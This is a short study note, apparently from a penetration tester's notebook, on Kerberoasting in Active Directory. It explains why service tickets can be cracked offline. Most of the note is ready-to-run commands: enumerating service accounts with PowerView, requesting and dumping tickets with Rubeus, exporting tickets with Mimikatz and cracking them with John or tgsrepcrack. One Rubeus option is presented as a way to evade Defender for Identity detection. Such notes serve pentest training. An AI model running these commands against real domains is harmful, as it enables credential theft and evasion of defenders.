---
tags:
  - privesc
cssclasses: []
---
- [Offline cracking of service account passwords.](https://www.redsiege.com/wp-content/uploads/2020/08/Kerberoastv4.pdf)
- The [[active-directory/notes/Kerberos]] session ticket (TGS) has a server portion which is encrypted with the password hash of service account. This makes it possible to request a ticket and do offline password attack.
- Because (non-machine) service account passwords are not frequently changed, this is a good attack vector.
- An important point to note is that we need a service ticket that is encrypted with an NTLM hash (RC4) and not AES, which uses a salt. Bruteforcing the AES key would be extremely difficult.
- The DC will, however, oblige to the client's requests of using a ticket with downgraded encryption. Unless RC4 is disabled throughout the forest.
#### Obtaining tickets

```powershell title:"Find user accounts used as service accounts (PowerView)"
Get-DomainUser -SPN
```

```powershell title:"Find user accounts used as service accounts (ActiveDirectory Module)"
Get-ADUser -Filter {ServicePrincipleName -ne "$null"} -Properties ServicePrincipalName
```

```batch title:"Use Rubeus to list Kerberoast stats"
Rubeus.exe kerberoast /stats
```

```batch title:"Use Rubeus to request a TGS"
Rubeus.exe kerberoast /user:username /simple
```

```powershell title:"Alternative: Request TGS using PowerView.ps1"
Invoke-Kerberoast | select Hash | ConvertTo-Csv
```

```batch title:"To avoid detections based on Encryption Downgrade for Kerberos EType (used by likes of MDI - 0x17 stands for rc4-hmac), look for Kerberoastable accounts that only support RC4_HMAC"
Rubeus.exe kerberoast /stats /rc4opsec
Rubeus.exe kerberoast /user:username /simple /rc4opsec
```

```batch title:"Kerberoast all possible accounts"
Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt
```

#### Cracking

```batch title:"Crack the ticket"
john.exe --wordlist:C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
```

#### Misc.

```batch title:"Check if the ticket has been granted"
klist.exe
```

```powershell title:"Export all tickets using Mimikatz (that were imported via /ptt)?"
Invoke-MimiKatz -Command '"kerberos::list /export"'
```

```batch title:"Crack the service account password"
python.exe .\tgsrepcrack.py .\10k-worst-passwords.txt 'tgs_file_name.kirbi'
```
